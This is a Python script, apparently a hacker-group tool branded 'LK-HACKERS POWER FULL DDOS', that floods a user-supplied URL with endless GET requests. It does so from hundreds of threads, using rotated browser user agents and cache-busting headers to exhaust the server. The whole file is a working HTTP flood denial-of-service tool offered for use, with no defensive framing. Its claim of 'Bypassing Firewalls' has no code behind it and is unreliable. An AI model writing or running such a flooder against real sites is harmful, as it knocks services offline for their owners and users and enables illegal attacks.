import threading
import requests
import random
import sys
import os
import time
from colorama import Fore, Style, init

# Initialize Colorama for colors
init(autoreset=True)

# --- CONFIGURATION & ASSETS ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

def blink_banner():
    # Red Blinking Banner effect
    for i in range(5):
        sys.stdout.write("\r" + Fore.RED + Style.BRIGHT + "  ██╗     ██╗  ██╗  ██╗   ██╗██╗  ██╗ ██████╗ ██████╗ ██████╗ ███████╗██████╗  ██████╗ ██████╗ ██████╗  ██████╗ ███████╗██████╗ ")
        sys.stdout.flush()
        time.sleep(0.5)
        sys.stdout.write("\r" + Fore.BLACK + "  ██╗     ██╗  ██╗  ██╗   ██╗██╗  ██╗ ██████╗ ██████╗ ██████╗ ███████╗██████╗  ██████╗ ██████╗ ██████╗  ██████╗ ███████╗██████╗ ")
        sys.stdout.flush()
        time.sleep(0.5)
    print("\n" + Fore.RED + Style.BRIGHT + "             [ LK-HACKERS POWER FULL DDOS /CYBER BLACK LION ]")
    print(Fore.RED + "======================================================================================")

def attack(target, threads_count):
    while True:
        try:
            ua = random.choice(USER_AGENTS)
            headers = {'User-Agent': ua, 'Cache-Control': 'no-cache', 'Accept-Encoding': 'gzip, deflate'}
            # Powerful GET request to exhaust server resources
            requests.get(target, headers=headers, timeout=5)
            print(Fore.RED + f"[!] Packet Sent -> {target} | Status: CRASHING...")
        except:
            pass

def main():
    os.system('clear')
    blink_banner()
    
    # Input Section
    print(Fore.YELLOW + "\n[+] Target URL (e.g., http://example.com): ")
    target = input(Fore.WHITE + ">> ")
    
    if not target.startswith("http"):
        print(Fore.RED + "[-] Error: Please include http:// or https://")
        sys.exit()

    print(Fore.YELLOW + "\n[+] Enter Number of Threads (More = More Power): ")
    try:
        thread_count = int(input(Fore.WHITE + ">> "))
    except ValueError:
        print(Fore.RED + "[-] Invalid input. Using 500 threads by default.")
        thread_count = 500

    print(Fore.GREEN + f"\n[+] Launching Attack on {target} with {thread_count} threads...")
    print(Fore.RED + "[!] Bypassing Firewalls... Engaged!")
    time.sleep(2)

    # Launching Multi-threading Attack
    for i in range(thread_count):
        t = threading.Thread(target=attack, args=(target, thread_count))
        t.daemon = True # Ensures threads stop when main program exits
        t.start()

    # Keep the main thread alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
